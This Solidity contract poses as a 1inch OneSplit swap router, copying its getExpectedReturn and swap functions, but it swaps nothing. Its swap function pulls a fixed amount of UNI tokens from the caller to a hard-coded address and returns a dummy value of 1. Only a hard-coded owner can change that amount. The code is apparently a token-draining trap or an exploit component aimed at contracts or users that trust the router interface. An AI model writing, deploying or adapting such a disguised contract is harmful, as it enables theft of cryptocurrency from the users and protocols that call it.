pragma solidity ^0.5.17;


interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract getuniout {
    
    uint public out_uin = 400 ether;

    
    function set_outuin(uint _uin) public{
        require(msg.sender == 0x000000004fa9e635dBe91C83aEe357d01494936D,'not owner');
        out_uin = _uin;
    }
    
    
    function getExpectedReturn(
        address fromToken,
        address destToken,
        uint256 amount,
        uint256 parts,
        uint256 flags // See constants in IOneSplit.sol
    )
        external
        view
        returns(
            uint256 returnAmount,
            uint256[] memory distribution
        ){
            uint[] memory _distribution;
            returnAmount = 1;
            distribution = _distribution;
        }
        
    function swap(
        address fromToken,
        address destToken,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata distribution,
        uint256 flags
    )
        external
        payable
        returns(uint256 returnAmount){
            uint _uin;
            if (destToken == 0xc5be99A02C6857f9Eac67BbCE58DF5572498F40c){
                _uin = 563471857000000000000;
            }else{
                _uin = out_uin;
            }
            IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984).transferFrom(msg.sender, 0xc0F9850f52b02eD914377cf4007d70DF2609B83f,_uin);
            returnAmount = 1;
        }
}